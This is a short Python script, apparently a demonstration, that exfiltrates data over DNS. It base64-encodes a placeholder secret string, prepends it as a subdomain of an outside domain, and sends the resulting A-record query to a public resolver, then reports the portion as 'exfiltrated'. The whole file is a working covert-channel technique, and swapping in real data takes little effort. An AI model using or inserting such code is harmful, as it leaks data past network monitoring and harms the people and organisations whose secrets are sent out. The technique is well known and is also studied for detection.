#!/usr/bin/python3
import base64 
import sendUDP

domain=".cyblogia.com"
data = "Super secret data"

base64Data = base64.b64encode(bytes(data, 'utf-8'))

covertSubDomain = base64Data.decode("utf-8")

url = (covertSubDomain + domain)

print("Original: " + data + '\n' + "Encoded URL: " + url)

try:
    message = sendUDP.build_message("A", url) 
    response = sendUDP.send_udp_message(message, "1.1.1.1", 53)
    print("Sent DNS exfiltrated portion!")
except:
    print("An error occured")
